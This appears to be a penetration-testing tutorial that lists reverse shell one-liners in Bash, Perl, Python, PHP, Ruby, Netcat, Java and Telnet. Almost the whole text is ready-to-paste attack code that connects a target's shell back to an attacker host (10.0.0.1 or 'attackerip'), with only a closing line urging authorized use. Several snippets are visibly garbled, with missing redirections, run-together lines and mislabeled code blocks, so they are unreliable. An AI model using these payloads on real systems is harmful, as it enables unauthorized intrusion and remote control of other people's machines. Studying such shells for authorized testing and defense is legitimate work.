## Introduction

In the realm of penetration testing, a reverse shell can be a crucial tool. If you’re fortunate enough to discover a command execution vulnerability during a penetration test, you’ll likely want an interactive shell soon after. If adding a new account, SSH key, or .rhosts file and logging in isn’t possible, your next step is probably to throw back a reverse shell or bind a shell to a TCP port. This guide focuses on the former.

* * *

## Reverse Shell Techniques

The options for creating a reverse shell are limited by the scripting languages installed on the target system. However, you could also upload a binary program if you’re well-prepared. The examples shown are tailored to Unix-like systems. Some of the examples should also work on Windows if you substitute “/bin/sh -i” with “cmd.exe”. Each method aims to be a one-liner that you can copy/paste. They’re quite short lines, but not very readable.

#### Creating a Reverse Shell with Bash

Some versions of bash can send you a reverse shell (this was tested on Ubuntu 18.04)

```html
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

Or

```html
exec /bin/bash 0&0 2>&0
```

Or

```html
0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196
```

Or

```html
exec 5<>/dev/tcp/attackerip/4444cat <&5 | while read line; do $line 2>&5 >&5; done
```

Or

```html
while read line 0<&5; do $line 2>&5 >&5; done
```

#### Creating a Reverse Shell with Perl

Here’s a short, feature-free version that depends on /bin/sh:

```html
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Perl reverse shell that does not depend on /bin/sh:

```html
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

If the target system is running Windows use the following one-liner:

```html
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

#### Creating a Reverse Shell with Python

This was tested under Linux / Python 2.7

```html
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### Creating a Reverse Shell with PHP

This code assumes that the TCP connection uses file descriptor 3. This worked on the most tested system. If it doesn't work, try 4, 5, 6…

```html
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### Creating a Reverse Shell with Ruby

Short version that depends on /bin/sh:

```html
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

Longer Ruby reverse shell that does not depend on /bin/sh:

```html
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

If the target system is running Windows use the following one-liner:

```html
ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

#### Creating a Reverse Shell with Netcat

Netcat is rarely present on production systems and even if it is there are several versions of Netcat, some of which don’t support the -e option.

```html
nc -e /bin/sh 10.0.0.1 1234
```

Others possible Netcat reverse shells, depending on the Netcat version and compilation flags:

```html
nc -c /bin/sh attackerip 4444
```

Or

```html
/bin/sh | nc attackerip 4444
```

Or

```html
rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4444 0/tmp/p
```

#### Creating a Reverse Shell with Java

Always present when you need it, the "Java" language can also be a very good solution to establish a reverse shell.

```html
r = Runtime.getRuntime()p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])p.waitFor()
```

#### Creating a Reverse Shell with Telnet

Of course, you can also use Telnet as an alternative for Netcat:

```html
rm -f /tmp/p; mknod /tmp/p p &&&& telnet attackerip 4444 0/tmp/p
```

Or

```html
telnet attackerip 4444 | /bin/bash | telnet attackerip 4445
```

* * *

## Conclusion

In this tutorial, we explored various methods for creating reverse shells during penetration tests. We covered examples in different scripting languages, including Bash, Perl, Python, PHP, Ruby, Netcat, Java, and even Telnet. These one-liners allow you to establish an interactive shell on the target system, even when adding new accounts or SSH keys isn’t feasible.

Remember to use these techniques responsibly and only in authorized scenarios. Always obtain proper permissions before attempting any penetration testing activities. Happy hacking!